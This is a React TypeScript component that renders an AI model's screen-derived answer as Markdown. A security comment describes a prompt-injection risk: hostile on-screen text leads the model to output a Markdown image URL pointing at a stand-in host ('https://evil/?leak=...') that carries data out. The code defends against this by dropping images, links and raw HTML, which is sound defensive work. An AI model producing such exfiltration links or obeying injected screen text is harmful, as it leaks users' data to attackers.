import { useMemo } from "react";
import Markdown from "react-markdown";
import remarkGfm from "remark-gfm";
import remend from "remend";
import { CodeBlock } from "./CodeBlock";

/**
 * Renders the model's answer as Markdown.
 *
 * SECURITY — this text is derived from whatever was on the user's screen, so it
 * is untrusted input being rendered into the app's own webview. Two separate
 * risks, both closed here:
 *
 * 1. HTML injection. `react-markdown` does not render raw HTML unless the
 *    `rehype-raw` plugin is added. It is deliberately absent and must stay
 *    absent — a `<script>` the model transcribes off the screen renders as
 *    inert text. `skipHtml` drops the tags entirely rather than showing them.
 *
 * 2. Exfiltration by image. Even with HTML disabled, plain Markdown
 *    `![x](https://evil/?leak=...)` still produces an `<img>`, and rendering it
 *    makes a request that can carry data out — no scripting required. Hostile
 *    text on screen could induce exactly that.
 *
 *    This popup explains code. It has no reason to load a remote image or offer
 *    a clickable link, so `img` renders nothing and `a` renders as plain text.
 *    Refusing the capability outright beats trying to filter destinations.
 */
export function Answer({ text }: { text: string }) {
  // Close unterminated `**bold`, `` `code `` and fences while streaming, so the
  // text doesn't flicker between interpretations as each token lands.
  const repaired = useMemo(() => remend(text), [text]);

  return (
    <div className="answer">
      <Markdown
        remarkPlugins={[remarkGfm]}
        skipHtml
        components={{
          // Dropped entirely — see the exfiltration note above.
          img: () => null,

          // Keep the words, refuse the navigation.
          a: ({ children }) => <span className="link-text">{children}</span>,

          // `node` is react-markdown's internal mdast node. It is part of the props
          // it hands every component, and spreading it onto a DOM element emits a
          // junk `node="[object Object]"` attribute - 299 times in a real answer,
          // since inline code is the commonest element the model emits.
          code: ({ node: _node, className, children, ...rest }) => {
            const text = String(children ?? "").replace(/\n$/, "");
            const lang = /language-(\w+)/.exec(className ?? "")?.[1];

            // react-markdown gives fenced blocks a language class or wraps them
            // in <pre>; a bare `code` with neither is inline.
            const isFenced = className != null || text.includes("\n");
            if (!isFenced) {
              return (
                <code className="inline-code" {...rest}>
                  {children}
                </code>
              );
            }
            return <CodeBlock code={text} lang={lang} />;
          },

          // CodeBlock brings its own <pre>; this stops them nesting.
          pre: ({ children }) => <>{children}</>,
        }}
      >
        {repaired}
      </Markdown>
    </div>
  );
}
